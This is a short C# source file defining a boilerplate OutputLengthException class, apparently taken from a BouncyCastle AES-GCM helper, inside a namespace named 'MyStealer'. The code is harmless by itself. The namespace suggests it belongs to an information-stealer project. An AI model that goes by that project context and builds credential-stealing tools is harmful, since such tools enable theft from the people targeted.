using System;
using System.Runtime.Serialization;

namespace MyStealer.Utils.BcAesGcm
{
    [Serializable]
    public class OutputLengthException
        : DataLengthException
    {
        public OutputLengthException()
        {
        }

        public OutputLengthException(string message)
            : base(message)
        {
        }

        public OutputLengthException(string message, Exception innerException)
            : base(message, innerException)
        {
        }

        protected OutputLengthException(SerializationInfo info, StreamingContext context)
            : base(info, context)
        {
        }
    }
}
